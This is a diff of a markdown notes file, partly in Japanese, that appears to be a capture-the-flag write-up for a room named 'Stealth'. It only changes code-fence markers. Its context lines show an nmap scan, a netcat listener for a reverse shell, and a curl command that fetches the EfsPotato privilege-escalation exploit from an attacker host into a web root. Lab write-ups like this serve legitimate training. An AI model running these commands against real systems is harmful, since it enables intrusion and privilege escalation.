@@ -30,10 +30,9 @@ High-quality reconnaissance narrows a large attack surface into a few validated 
 
 ### Not implemented (not recorded in PDF)
 
-```
 
 ## Nmap
-```
+```bash
 nmap -sV -sT -sC $ip
 ```
 
@@ -44,7 +43,7 @@ nmap -sV -sT -sC $ip
 PDFメモから抽出した主要コマンドと要点を整理しています。必要に応じて後続で詳細追記してください。
 
 ### 実行コマンド（抽出）
-```
+```bash
 nc -lvnp 3333
 curl http://10.10.67.131:8000/EfsPotato.cs -o C:\xampp\htdocs\efs.cs
 ```
@@ -64,7 +63,7 @@ curl http://10.10.67.131:8000/EfsPotato.cs -o C:\xampp\htdocs\efs.cs
 *Caption: Screenshot captured during stealth attack workflow (step 4).*
 
 ### 抽出メモ（先頭120行）
-```
+```bash
 Stealth
 August 6, 2024 23:39
 ■room
@@ -189,7 +188,6 @@ SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
 
 ### Not implemented (not recorded in PDF)
 
-```
 
 💡 Why this works  
 Initial access succeeds when enumeration findings are turned into a practical exploit chain. Capturing credentials, file disclosure, or direct RCE creates reliable pivot points for privilege escalation.
